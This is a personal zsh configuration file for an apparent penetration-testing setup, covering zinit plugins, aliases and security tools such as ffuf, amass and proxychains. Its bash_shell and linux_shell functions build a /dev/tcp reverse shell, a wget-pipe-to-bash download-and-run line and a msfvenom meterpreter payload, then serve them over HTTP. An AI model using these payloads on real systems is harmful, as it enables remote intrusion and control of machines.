zmodload zsh/zprof
# history {{{
#
# Sets history options.
#
# Authors:
#   Robby Russell <robby@planetargon.com>
#   Sorin Ionescu <sorin.ionescu@gmail.com>
#

HISTFILE="${HOME}/.zsh_history"
HISTSIZE=10000000
SAVEHIST=10000000

setopt BANG_HIST                 # Treat the '!' character specially during expansion.
setopt EXTENDED_HISTORY          # Write the history file in the ":start:elapsed;command" format.
setopt INC_APPEND_HISTORY        # Write to the history file immediately, not when the shell exits.
setopt SHARE_HISTORY             # Share history between all sessions.
setopt HIST_EXPIRE_DUPS_FIRST    # Expire duplicate entries first when trimming history.
setopt HIST_IGNORE_DUPS          # Don't record an entry that was just recorded again.
setopt HIST_IGNORE_ALL_DUPS      # Delete old recorded entry if new entry is a duplicate.
setopt HIST_FIND_NO_DUPS         # Do not display a line previously found.
setopt HIST_IGNORE_SPACE         # Don't record an entry starting with a space.
setopt HIST_SAVE_NO_DUPS         # Don't write duplicate entries in the history file.
setopt HIST_REDUCE_BLANKS        # Remove superfluous blanks before recording entry.
setopt HIST_VERIFY               # Don't execute immediately upon history expansion.
setopt HIST_BEEP                 # Beep when accessing nonexistent history.
setopt HIST_IGNORE_SPACE         # 删除以空格开头的命令
setopt HIST_REDUCE_BLANKS        # 删除多余的空格
# }}}
# zinit {{{
### Added by Zinit's installer
if [[ ! -f $HOME/.zinit/bin/zinit.zsh ]]; then
    print -P "%F{33}▓▒░ %F{220}Installing %F{33}DHARMA%F{220} Initiative Plugin Manager (%F{33}zdharma/zinit%F{220})…%f"
    command mkdir -p "$HOME/.zinit" && command chmod g-rwX "$HOME/.zinit"
    command git clone https://github.com/zdharma/zinit "$HOME/.zinit/bin" && \
        print -P "%F{33}▓▒░ %F{34}Installation successful.%f%b" || \
        print -P "%F{160}▓▒░ The clone has failed.%f%b"
fi

source "$HOME/.zinit/bin/zinit.zsh"
autoload -Uz _zinit
(( ${+_comps} )) && _comps[zinit]=_zinit

zinit ice id-as="z-bin"
zinit light  zinit-zsh/z-a-bin-gem-node

zinit ice id-as="z-readurl"
zinit light  zinit-zsh/z-a-readurl

# 安装 lua 环境
# zinit id-as="lua" as='readurl|null' mv="%ID% -> lua.tar.gz"\
#         atclone="ziextract --move lua.tar.gz;" make="all test" atpull="%atclone" \
#         fbin="lua" dlink="/lua/lua/archive/refs/tags/v%VERSION%.tar.gz" for \
#         "https://github.com/lua/lua/releases"
#
# 从 www.lua.org 安装 lua 不需要 libreadline 
# zinit id-as="lua" as='null' mv="%ID% -> lua.tar.gz" pick="src/lua"\
#         atclone="ziextract --move lua.tar.gz;" make atpull="%atclone" \
#         sbin="src/lua" for \
#                 "https://www.lua.org/ftp/lua-5.4.3.tar.gz"
#
# 编译 gtags
# zinit id-as="gtags" as="readurl|null" mv="%ID% -> global.tar.gz" atclone="ziextract --move global.tar.gz;./configure --prefix=${LOCAL};make;make install" atpull="%atclone"\
#     dlink='!global-%VERSION%.tar.gz~%global-6.6.tar.gz%'\
#     for "https://ftp.gnu.org/pub/gnu/global/"


zinit light-mode   for \
id-as='z-a-rust'    zinit-zsh/z-a-rust \
id-as='z-a-monitor'    zinit-zsh/z-a-as-monitor \
id-as='z-a-patch'    zinit-zsh/z-a-patch-dl 

zinit ice depth"1" id-as='pw10k'
zinit light romkatv/powerlevel10k

zinit ice depth="1" id-as="vi-mode"
zinit light jeffreytse/zsh-vi-mode

zinit ice id-as="cht"  mv="%ID% -> cht.sh" sbin="cht.sh" cloneonly
zinit snippet https://cht.sh/:cht.sh

zinit  light-mode lucid wait="0"  for\
    id-as='fzf-tab'             "Aloxaf/fzf-tab" \
    id-as='syntax'              "zdharma/fast-syntax-highlighting" \
    id-as='evalcache'           "mroth/evalcache" \
    id-as='autosuggestions'     atload='_zsh_autosuggest_start' 'zsh-users/zsh-autosuggestions' \
    id-as='search-command'      "zdharma/history-search-multi-word" \
    id-as='docker-completion'   as="completion" mv="%ID% -> _docker" "https://raw.githubusercontent.com/docker/cli/master/contrib/completion/zsh/_docker"\
    id-as='adb-completion'      as="completion" mv="%ID% -> _adb" "https://github.com/ohmyzsh/ohmyzsh/blob/master/plugins/adb/_adb"\
    id-as='autopep8-completion' as="completion" mv="%ID% -> _autopep8" "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/autopep8/_autopep8"\
    id-as='httpie-completion'   as="completion" mv="%ID% -> _httpie" "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/httpie/_httpie"\
    id-as='cht_completion'      as="completion" mv="%ID% -> _cht"    "https://cheat.sh/:zsh"\
    id-as='gf_completion'       as="completion" mv="%ID% -> _gf"    "https://raw.githubusercontent.com/tomnomnom/gf/master/gf-completion.zsh"\
    id-as='tmuxinator_completion'   as="completion" mv="%ID% -> _tmuxinator"    "https://raw.githubusercontent.com/tmuxinator/tmuxinator/master/completion/tmuxinator.zsh"\
    id-as='alias-tips'          "djui/alias-tips" \
    id-as='fzf-marks'           "urbainvaes/fzf-marks" \
    id-as='dotbare'             "kazhala/dotbare" \
    id-as='auto_env'            "nocttuam/autodotenv"\
    id-as='fz'                  "changyuheng/fz" \
    id-as='fzf-completion'      "https://raw.githubusercontent.com/junegunn/fzf/master/shell/completion.zsh "\
    id-as='alias-finder'        "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/alias-finder/alias-finder.plugin.zsh" \
    id-as='clipbord'            "https://github.com/ohmyzsh/ohmyzsh/blob/master/lib/clipboard.zsh" \
    id-as='safe-paste'          "OMZ::plugins/safe-paste/safe-paste.plugin.zsh" \
    id-as='copyfile'            "OMZ::plugins/copyfile/copyfile.plugin.zsh"\
    id-as='z.lua'               "skywind3000/z.lua"\
    id-as='git-alias'           atload="unalias gra glo ga  gd grh gcf gcb gco gss gclean grb" "OMZ::plugins/git/git.plugin.zsh"\
    id-as='forgit'              "wfxr/forgit"\
    id-as='gpg-crypt'           "Czocher/gpg-crypt" \
    id-as='git-flow-completion' "bobthecow/git-flow-completion" \
    id-as='k'                   "supercrabtree/k" \
    id-as="msfvenom"            as="completion" mv="%ID% ->_msfvenom" "https://raw.githubusercontent.com/Green-m/msfvenom-zsh-completion/master/_msfvenom" \
    id-as='cd-reminder'         "bartboy011/cd-reminder" \
    id-as='blackbox'            "StackExchange/blackbox"\
    id-as='zsh-case'            "rtuin/zsh-case"\
    id-as='base-64'             "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/encode64/encode64.plugin.zsh" \
    id-as='hitokoto'            "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/hitokoto/hitokoto.plugin.zsh"\
    id-as='copydir'             "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/copydir/copydir.plugin.zsh" \

zinit ice lucid wait="0" id-as="eval.zsh"
zinit snippet $(echo "${HOME}/.config/custom/eval.zsh")


zinit ice lucid depth"1" wait="0" id-as="extract"
zinit snippet OMZ::plugins/extract

zinit ice lucid wait="0" id-as="bindkey"
zinit snippet $(echo "${HOME}/.config/custom/bindkey.sh")

zinit ice blockf lucid wait="0" atload='zpcompinit;zpcdreplay' atclone="zinit creinstall zsh-completions" id-as="zsh-completions" as="completion"
zinit light zsh-users/zsh-completions


zinit ice wait="1" lucid id-as="autopair"
zinit light hlissner/zsh-autopair

zinit  as="null" wait="1" lucid from="gh-r" for \
    id-as="delta"           mv="delta* -> delta"     sbin="delta/delta"               dandavison/delta\
    id-as="lazygit"                                  sbin                             jesseduffield/lazygit\
    id-as="navi"                                     sbin                             denisidoro/navi\
    id-as="fzf"                                      sbin                             junegunn/fzf 


# direnv 进入目录的时候自动加载和卸载环境变量 
zinit from"gh-r" as"program" mv"direnv* -> direnv" id-as="direnv"\
    atclone'./direnv hook zsh > zhook.zsh' atpull'%atclone' \
    pick"direnv" src="zhook.zsh" for \
        direnv/direnv

# 仅仅在 $(git --version) < 2.55 时可以使用
# zinit ice cloneopts="--depth 1 --filter=blob:none --sparse" atclone="git sparse-checkout set shell-completion/zsh" as="completion" id-as="systemd-completion" wait="0" lucid
# zinit light https://github.com/systemd/systemd

# zinit ice svn as="completion" id-as="systemd-completion" wait="0" lucid
# zinit snippet https://github.com/systemd/systemd/tree/main/shell-completion/zsh
#
# 安装 systemctl 补全 系统为 kali linux , 只需要运行一次
# zinit creinstall /usr/share/zsh/vendor-completions/

zinit ice wait="1" lucid atclone="./configure --prefix=${ZPFX} --sysconfdir=${HOME}/.config;make && make install-config" atpull="%atclone" id-as="proxychains-ng"
zinit light rofl0r/proxychains-ng

zinit ice wait="1" lucid from="gh-r" mv="ri* -> rg" sbin="rg/rg" atclone="chown ${USERNAME}:${USERNAME} rg/complete/*;zinit creinstall rg" atpull="%atclone" id-as="rg"
zinit light BurntSushi/ripgrep

zinit ice wait="1" lucid from="gh-r" mv="fd* -> fd" sbin="fd/fd" atclone="chown ${USERNAME}:${USERNAME} fd/autocomplete/*;zinit creinstall fd" atpull="%atclone" id-as="fd"
zinit light @sharkdp/fd

zinit ice wait="1" lucid from="gh-r" mv="bat* -> bat" sbin="bat/bat"   atclone="mv bat/autocomplete/bat.zsh bat/autocomplete/_bat;chown ${USERNAME}:${USERNAME} bat/autocomplete/*;zinit creinstall bat" atpull="%atclone" id-as="bat"
zinit light @sharkdp/bat

zinit ice wait="1" lucid from="gh-r"  sbin="bin/exa"  mv="completions/exa.zsh -> completions/_exa"  atclone="chown ${USERNAME}:${USERNAME} completions/*;zinit creinstall exa" atpull="%atclone" id-as="exa"
zinit light ogham/exa


# amass
zinit ice wait="1" lucid from="gh-r"  fbin="amass/amass"  mv="amass* -> amass"   id-as="amass"
zinit light OWASP/Amass

# git-flow
zinit ice wait="1" lucid as="null"  id-as="git-flow" mv="%ID% -> git-flow.sh" atclone="chmod u+x git-flow.sh;export INSTALL_PREFIX=${HOME}/.local/bin;./git-flow.sh"
zinit snippet https://raw.github.com/nvie/gitflow/develop/contrib/gitflow-installer.sh

# neovim
zinit ice wait="1" lucid as="null" from="gh-r" id-as="neovim" mv="nvim* -> neovim" sbin="neovim/bin/nvim"
zinit light neovim/neovim

# acme.sh
zinit ice wait="1" lucid as="null" id-as="acme" depth="1" sbin="acme.sh"
zinit light acmesh-official/acme.sh

zinit ice wait="1" lucid as="bin" id-as="tmux-fzf" sbin="tmux-fzf"
zinit snippet https://raw.githubusercontent.com/junegunn/fzf/master/bin/fzf-tmux

# gron json 处理器
zinit ice wait='1' lucid as="null" id-as="gron"  from="gh-r" sbin="gron"
zinit light tomnomnom/gron

# ffuf  fast fuzzer
zinit ice wait="1" lucid as="null" id-as="ffuf" from="gh-r" sbin="ffuf"
zinit light ffuf/ffuf
#
# bindkey 

#https://github.com/tomnomnom/gf 
# End of Zinit's installer chunk
# }}}
### z.lua {{{
# 识别根目录的文件
export _ZL_ROOT_MARKERS=".git,.svn,.hg,.root,package.json"
export _ZL_CMD='j'
# }}}
# P10K{{{
# Enable Powerlevel10k instant prompt. Should stay close to the top of ~/.zshrc.
# Initialization code that may require console input (password prompts, [y/n]
# confirmations, etc.) must go above this block; everything else may go below.
typeset -g POWERLEVEL9K_INSTANT_PROMPT=quiet
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
    zinit ice id-as="p10k-instan-prompt"
    zinit snippet $(echo "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh")
  # source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi
# }}}
### fzf {{{
# 显示隐藏文件 排除 .git 文件夹
export FZF_DEFAULT_COMMAND='fd --type file --follow --hidden --exclude .git --color=always'
# 设置颜色显示
#export FZF_DEFAULT_COMMAND="fd --type file --color=always"
# export FZF_DEFAULT_OPTS="--ansi --preview-window 'right:60%' --preview 'batcat --color=always --style=header,grid --line-range :300 {}'"
export FZF_DEFAULT_OPTS="--ansi"
#}}}
## export {{{
export TZ='Asia/Shanghai'
export DOTBARE_DIR="${HOME}/.myconfig"
export DOTBARE_TREE="${HOME}"

# ips=$(ip -o addr show up primary scope global |while read -r num dev fam addr rest; do echo ${addr%/*}; done)
# hostname -I | tr ' ' '\n' 
export LOCAL_IP=$(hostname -I | tr ' ' '\n')
export LISTEN_IP="0.0.0.0"
export TARGET_IP=""
export TARGET_URL=""
export TARGET_HTTP_PORT="80"
export TARGET_HTTPS_PORT="443"
export TARGET_FQDN=""
export LOCAL_PORT="443"
export GOPATH="${HOME}/.local/go"
export BIN="${HOME}/.local/bin"
export TEMP=$(uuid | tr -d '-' | cut -c '1-8')


if [ -x "$(command -v nvim)" ]; then
    export EDITOR='nvim'
    export MANPAGER="nvim -c MANPAGER -"
    export PAGER="nvim -c PAGER -"
elif [ -x "$(command -v vim)" ]; then
    export EDITOR='vim'
    export MANPAGER="vim -c MANPAGER -"
    export PAGER="vim -c PAGER -"
else
    export MANPAGER="less -RF"
    export PAGER="less -RF"
fi


less --mouse 2>&1 | rg "no mouse" >/dev/null 2>&1
if test "$?" -eq 0;then
    export BAT_PAGER="less -RF"
    export DELTA_PAGER="less -RF"
else
    export BAT_PAGER="less --RAW-CONTROL-CHARS --quit-if-one-screen --mouse"
    export DELTA_PAGER="less --RAW-CONTROL-CHARS --quit-if-one-screen --mouse"
fi

export SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)
export GPG_TTY=$(tty)
export LOCAL="${HOME}/.local"
export LANG="zh_CN.UTF-8"
PATH=${PATH}:${HOME}/.local/bin
PATH=${PATH}:${GOPATH}/bin
#}}}
###alias {{{
if [ -x "$(command -v exa)" ]; then
    alias ls="exa"
    alias la="exa --long --all --group"
    alias ll="exa --long --group"
else
    la='ls -alh --color=auto'
    ll='ls -lh --color=auto'
fi
if [ -x "$(command -v rg)" ]; then
    alias grep='rg'
else
    alias rg='grep --color=auto'
fi
if [ -x "$(command -v fd)" ]; then
    alias find='fd'
else
    alias fd='find'
fi
if [ -x "$(command -v bat)" ]; then
    alias cat="bat"
else
    alias bat="cat"
fi
if [ -x "$(command -v nvim)" ]; then
    alias vim="nvim"
else
    alias nvim='vim'
fi
if [ -x "$(command -v delta)" ];then
    alias diff="delta"
else
    alias delta="diff"
fi
# jf foo 使用 fzf 交互选择
alias jf='j -I'
# jb foo
alias jb='j -b'
# jbf foo 使用 fzf 选择父目录
alias jbf='j -b -I'
# jh  使用 fzf 选择最近的 10 条路径
alias jh='j -I -t .'
# jc 跳转到当前路径下的子目录
alias gdh="git diff HEAD"
alias vitmux="$EDITOR ${HOME}/.tmux.conf"
alias gw="${HOME}/.local/go/bin/gf"
alias cht="cht.sh"
alias jc='j -c -I'
alias fgrep='fgrep --color=auto'
alias mux='tmuxinator'
alias nmap='grc nmap'
alias sqlmap='sqlmap --random-agent'
alias egrep='egrep --color=auto'
alias diff='diff --color=auto'
alias ip='ip --color=auto'
alias tsrc='tmux source ~/.tmux.conf'
alias batcat='bat' alias gitc='/usr/bin/git --git-dir=$HOME/.myconfig/ --work-tree=$HOME'
alias config='dotbare'
alias zshconfig="${EDITOR} ~/.zshrc"
alias vimconfig="${EDITOR} ~/.config/nvim/init.vim"
alias exa='exa --icons'
alias viminstall="${EDITOR} ~/.config/install.sh"
alias install="~/.config/install.sh"
alias prz='proxychains4 -q zsh'
alias pr='proxychains4 -q'
alias cedit='dotbare fedit'
function _z() { _zlua "$@"; }
function ffufr() {
  ffuf -c -w "/path/to/SecLists/Discovery/Web-Content/$1" -u "$2/FUZZ" -recursion
}
# work with Burp
function ffufb(){
    ffuf -reply-proxy http://127.0.0.1:8080 -w $(fzf)
}
 

function cdg (){
    repo=$(gita ls | tr ' ' '\n' | fzf)
    if test -n "$repo";then
        cd $(gita ls "$repo")
    fi
}
function cde(){
    if [ $1 ];then
        dir=$1
    else
        dir=.
    fi
    dir=$(fd . --type=d --full-path "$dir" --color=always |fzf --preview 'exa --icons  {}')
    cd $dir
}
function cdv() {
    dir=$(fd -d 1 . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    cd $dir
}
function cdh() {
    dir=$(fd  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    cd $dir
}
function rmv() {
    dir=$(fd -d 1  . --type=d --full-path ${HOME}/vulnhub --color=always |fzf --preview 'exa --icons  {}')
    rm -fr  $dir
}
alias pdict=_pdict
function _pdict(){
    fd . "${HOME}/dict" | fzf | clipcopy
}
function ef(){
    if [ $1 ];then
        dir=$1
    else
        dir=.
    fi
    file=$(fd . --type=f --full-path "$dir" --color=always -H -E ".git"  -E ".vim"| fzf --ansi --preview-window 'right:60%' --preview 'bat --color=always --style=header,grid --line-range :300 {}')
    if test -n "$file";then
        $EDITOR $file
    fi
}

function wan_ip(){
    export WAN_IP=$(curl ifconfig.me)
}
fucntion get_tmux(){
    name=$(tmux ls | cut -d '-' -f 1|fzf)
    tmux a -t $name
}
function bash_shell(){
    echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp
    echo "wget -O -  http://$LOCAL_IP:8080/temp | bash" | clipcopy
    cd /tmp
    python3 -m http.server 8080
}
function linux_shell(){
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=443 --platform linux -f elf -o /tmp/temp
    cd /tmp
    echo "wget http://$LOCAL_IP:8080/temp"
    python3 -m http.server 8080
}
function ssht () {/usr/bin/ssh -t "$@" "tmux attach -s 'master' || tmux new -t 'master' ";}
function src() {
	local cache="$ZSH_CACHE_DIR"
	autoload -U compinit zrecompile
	compinit -i -d "$cache/zcomp-$HOST"

	for f in ${ZDOTDIR:-~}/.zshrc "$cache/zcomp-$HOST"; do
		zrecompile -p $f && command rm -f $f.zwc.old
	done

	# Use $SHELL if it's available and a zsh shell
	local shell="$ZSH_ARGZERO"
	if [[ "${${SHELL:t}#-}" = zsh ]]; then
		shell="$SHELL"
	fi

	# Remove leading dash if login shell and run accordingly
	if [[ "${shell:0:1}" = "-" ]]; then
		exec -l "${shell#-}"
	else
		exec "$shell"
	fi
}
zinit ice id-as="p10k.zsh"
zinit snippet $(echo ${HOME}/.p10k.zsh)
#}}} 
# 设置 c 库位置{{{
export LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:${HOME}/.local/lib
export C_INCLUDE_PATH=${C_INCLUDE_PATH}:${HOME}/.local/include
export CPLUS_INCLUDE_PATH=${CPLUS_INCLUDE_PATH}:${HOME}/.local/include
# }}}
# WSL 环境变量设置{{{
uname -a | rg WSL 1>/dev/null 2>&1
if test "$?" -eq 0;then
   export GIT_SSH="/mnt/c/Windows/System32/OpenSSH/ssh.exe"
   alias gpg="gpg.exe"
   alias ssh="ssh.exe"
fi
# }}}
